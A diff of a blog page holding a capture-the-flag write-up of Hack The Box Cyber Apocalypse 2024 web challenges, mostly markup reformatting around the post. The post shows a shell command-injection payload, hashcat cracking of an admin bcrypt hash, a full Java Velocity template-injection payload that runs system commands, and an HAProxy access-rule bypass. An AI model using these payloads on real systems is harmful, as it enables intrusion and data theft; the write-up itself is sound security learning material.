@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="en-us" dir="ltr">
+<html lang="en" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is the writeup of HTB cyber apocalypse 2024 web challenges.
 I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.
-Web Category  TimeKORP rating: very easy
+Web Category TimeKORP rating: very easy
 Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; .'>
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; .'>
 <title>HTB_cyberapocalypse_2024</title>
 
 <link rel='canonical' href='https://f0rk3b0mb.github.io/p/htb_cyberapocalypse_2024/'>
@@ -13,9 +13,9 @@ Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , fro
 <link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='HTB_cyberapocalypse_2024'>
 <meta property='og:description' content='This is the writeup of HTB cyber apocalypse 2024 web challenges.
 I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.
-Web Category  TimeKORP rating: very easy
+Web Category TimeKORP rating: very easy
 Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; .'>
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; .'>
 <meta property='og:url' content='https://f0rk3b0mb.github.io/p/htb_cyberapocalypse_2024/'>
 <meta property='og:site_name' content='f0rk3b0mb'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-03-11T13:23:40&#43;03:00'/><meta property='article:modified_time' content='2024-03-11T13:23:40&#43;03:00'/><meta property='og:image' content='https://f0rk3b0mb.github.io/cover/ca2024.png' />
@@ -23,9 +23,9 @@ Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , fro
     <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="HTB_cyberapocalypse_2024">
 <meta name="twitter:description" content="This is the writeup of HTB cyber apocalypse 2024 web challenges.
 I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.
-Web Category  TimeKORP rating: very easy
+Web Category TimeKORP rating: very easy
 Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; ."><meta name="twitter:card" content="summary_large_image">
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; ."><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://f0rk3b0mb.github.io/cover/ca2024.png' />
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
 <script>
@@ -468,33 +468,31 @@ if (!doNotTrack) {
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
-class TimeModel
-{
-    public function __construct($format)
-    {
-        $this-&gt;command = &#34;date &#39;+&#34; . $format . &#34;&#39; 2&gt;&amp;1&#34;;
-    }
-
-    public function getTime()
-    {
-        $time = exec($this-&gt;command);
-        $res  = isset($time) ? $time : &#39;?&#39;;
-        return $res;
-    }
-}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class TimeModel
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    public function __construct($format)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        $this-&gt;command = &#34;date &#39;+&#34; . $format . &#34;&#39; 2&gt;&amp;1&#34;;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public function getTime()
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        $time = exec($this-&gt;command);
+</span></span><span class="line"><span class="cl">        $res  = isset($time) ? $time : &#39;?&#39;;
+</span></span><span class="line"><span class="cl">        return $res;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>This is classic command injection.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">payload :    %H:%M:%D&#39;;cat flag.txt
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">payload :    %H:%M:%D&#39;;cat flag.txt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>flag: HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}</p>
 <p><img src="/images/ca2024/cmd.png"
@@ -527,26 +525,22 @@ class TimeModel
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">admin: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
-</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">hashcat -m 3200 hashcat.txt /usr/share/wordlists/rockyou.txt
-
-$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hashcat -m 3200 hashcat.txt /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Cracking the password using hashcat we get the password : password123</p>
 <p>We can then login to get the flag</p>
@@ -603,14 +597,14 @@ $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">String template = &#34;&#34;;
-
-        try {
-            template = readFileToString(&#34;/app/src/main/resources/templates/index.html&#34;, textString);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">String template = &#34;&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            template = readFileToString(&#34;/app/src/main/resources/templates/index.html&#34;, textString);
+</span></span><span class="line"><span class="cl">        } catch (IOException e) {
+</span></span><span class="line"><span class="cl">            e.printStackTrace();
+</span></span><span class="line"><span class="cl">        }
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Our input was being used in a template. This is dangerous if no filters are applied. I quickly googled SSTI in java (Server Side Template Injection) payloads. Got this &raquo; <a class="link" href="https://iwconnect.com/apache-velocity-server-side-template-injection/"  target="_blank" rel="noopener"
     >here</a> .</p>
@@ -644,32 +638,32 @@ $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#set($s=&#34;&#34;)
-            #set($stringClass=$s.getClass())
-            #set($stringBuilderClass=$stringClass.forName(&#34;java.lang.StringBuilder&#34;))
-            #set($inputStreamClass=$stringClass.forName(&#34;java.io.InputStream&#34;))
-            #set($readerClass=$stringClass.forName(&#34;java.io.Reader&#34;))
-            #set($inputStreamReaderClass=$stringClass.forName(&#34;java.io.InputStreamReader&#34;))
-            #set($bufferedReaderClass=$stringClass.forName(&#34;java.io.BufferedReader&#34;))
-            #set($collectorsClass=$stringClass.forName(&#34;java.util.stream.Collectors&#34;))
-            #set($systemClass=$stringClass.forName(&#34;java.lang.System&#34;))
-            #set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
-            #set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
-            #set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))
-
-            #set($runtime=$stringClass.forName(&#34;java.lang.Runtime&#34;).getRuntime())
-            #set($process=$runtime.exec(&#34;cat ../flag2023911480.txt&#34;))
-            #set($null=$process.waitFor() )
-
-            #set($inputStream=$process.getInputStream())
-            #set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
-            #set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
-            #set($stringBuilder=$stringBuilderConstructor.newInstance())
-
-            #set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
-
-            $output
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#set($s=&#34;&#34;)
+</span></span><span class="line"><span class="cl">            #set($stringClass=$s.getClass())
+</span></span><span class="line"><span class="cl">            #set($stringBuilderClass=$stringClass.forName(&#34;java.lang.StringBuilder&#34;))
+</span></span><span class="line"><span class="cl">            #set($inputStreamClass=$stringClass.forName(&#34;java.io.InputStream&#34;))
+</span></span><span class="line"><span class="cl">            #set($readerClass=$stringClass.forName(&#34;java.io.Reader&#34;))
+</span></span><span class="line"><span class="cl">            #set($inputStreamReaderClass=$stringClass.forName(&#34;java.io.InputStreamReader&#34;))
+</span></span><span class="line"><span class="cl">            #set($bufferedReaderClass=$stringClass.forName(&#34;java.io.BufferedReader&#34;))
+</span></span><span class="line"><span class="cl">            #set($collectorsClass=$stringClass.forName(&#34;java.util.stream.Collectors&#34;))
+</span></span><span class="line"><span class="cl">            #set($systemClass=$stringClass.forName(&#34;java.lang.System&#34;))
+</span></span><span class="line"><span class="cl">            #set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
+</span></span><span class="line"><span class="cl">            #set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
+</span></span><span class="line"><span class="cl">            #set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            #set($runtime=$stringClass.forName(&#34;java.lang.Runtime&#34;).getRuntime())
+</span></span><span class="line"><span class="cl">            #set($process=$runtime.exec(&#34;cat ../flag2023911480.txt&#34;))
+</span></span><span class="line"><span class="cl">            #set($null=$process.waitFor() )
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            #set($inputStream=$process.getInputStream())
+</span></span><span class="line"><span class="cl">            #set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
+</span></span><span class="line"><span class="cl">            #set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
+</span></span><span class="line"><span class="cl">            #set($stringBuilder=$stringBuilderConstructor.newInstance())
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            #set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            $output
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Just use the payload in the browser and capture the request in burp.</p>
 <p>flag : HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}</p>
@@ -696,16 +690,14 @@ $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
-</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/flag   protected by middleware
-
-/chat/&lt;int:chat_id&gt;  protected by middleware
-
-/get_ticket  open but blocked by ha proxy
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/flag   protected by middleware
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/chat/&lt;int:chat_id&gt;  protected by middleware
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/get_ticket  open but blocked by ha proxy
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>A quick look at the proxy configuration</p>
 <div class="highlight"><div class="chroma">
@@ -715,16 +707,14 @@ $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
-</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">frontend haproxy
-    bind 0.0.0.0:1337
-    default_backend backend
-
-    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">frontend haproxy
+</span></span><span class="line"><span class="cl">    bind 0.0.0.0:1337
+</span></span><span class="line"><span class="cl">    default_backend backend
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>So we had to find a way to bypass this. I used a lot of time on this part. Until i found this &raquo; <a class="link" href="https://www.haproxy.com/blog/december-2023-cve-2023-45539-haproxy-accepts-as-part-of-the-uri-component-fixed#:~:text=HAProxy%20before%202.8.,png%20to%20a%20static%20server."  target="_blank" rel="noopener"
     >here</a></p>
@@ -737,17 +727,15 @@ $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
-</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">WORKDIR /tmp
-RUN wget https://www.haproxy.org/download/2.8/src/haproxy-2.8.1.tar.gz &amp;&amp; \
-    tar zxvf haproxy-*.tar.gz &amp;&amp; cd haproxy-* &amp;&amp; \
-    make TARGET=linux-musl &amp;&amp; \
-    make install
-RUN rm -rf *
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">WORKDIR /tmp
+</span></span><span class="line"><span class="cl">RUN wget https://www.haproxy.org/download/2.8/src/haproxy-2.8.1.tar.gz &amp;&amp; \
+</span></span><span class="line"><span class="cl">    tar zxvf haproxy-*.tar.gz &amp;&amp; cd haproxy-* &amp;&amp; \
+</span></span><span class="line"><span class="cl">    make TARGET=linux-musl &amp;&amp; \
+</span></span><span class="line"><span class="cl">    make install
+</span></span><span class="line"><span class="cl">RUN rm -rf *
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From the article if we make a request to /api/v1/get_ticket we get denied but if we make request to /api/v1/get_ticket# we bypass the acl.</p>
 <p>From here i gotr the jwt token. I tries common methos of exploiting jwt but none of them worked. UNtil i searched for a vulnerability in python_jwt==3.3.3 from the requirements.txt</p>
@@ -785,12 +773,10 @@ RUN rm -rf *
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">grpcurl  -plaintext  -import-path ./  -proto ptypes.proto -d &#39;{&#34;customer&#34;: &#34;examplecusomer&#34;, &#34;testimonial&#34;: &#34;exampletestimonial&#34;}&#39; 94.237.59.119:45387 RickyService.SubmitTestimonial
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">grpcurl  -plaintext  -import-path ./  -proto ptypes.proto -d &#39;{&#34;customer&#34;: &#34;examplecusomer&#34;, &#34;testimonial&#34;: &#34;exampletestimonial&#34;}&#39; 94.237.59.119:45387 RickyService.SubmitTestimonial
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Above is the format for grpcurl. Breakdown:</p>
 <ul>
@@ -807,14 +793,12 @@ RUN rm -rf *
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
-</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">for _, char := range []string{&#34;/&#34;, &#34;\\&#34;, &#34;:&#34;, &#34;*&#34;, &#34;?&#34;, &#34;\&#34;&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;|&#34;, &#34;.&#34;} {
-		customer = strings.ReplaceAll(customer, char, &#34;&#34;)
-	}
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">for _, char := range []string{&#34;/&#34;, &#34;\\&#34;, &#34;:&#34;, &#34;*&#34;, &#34;?&#34;, &#34;\&#34;&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;|&#34;, &#34;.&#34;} {
+</span></span><span class="line"><span class="cl">		customer = strings.ReplaceAll(customer, char, &#34;&#34;)
+</span></span><span class="line"><span class="cl">	}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>NOTE: Beyond this point i did after the ctf , i did not solve this one.</p>
 <p>Official writeup &raquo; <a class="link" href="https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/web/%5BEasy%5D%20Testimonial"  target="_blank" rel="noopener"
@@ -852,6 +836,25 @@ RUN rm -rf *
     <h2 class="section-title">Related content</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/urchinsec_2024/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/urchinsec.png" loading="lazy" data-key="" data-hash="/cover/urchinsec.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Urchinsec_2024</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -924,25 +927,6 @@ RUN rm -rf *
 
         <div class="article-details">
             <h2 class="article-title">Blackhat_mea_2023</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/shehacks_intrervasity_2023/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/cover/shehacks.png" loading="lazy" data-key="" data-hash="/cover/shehacks.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Shehacks_intrervasity_2023</h2>
         </div>
     </a>
 </article>
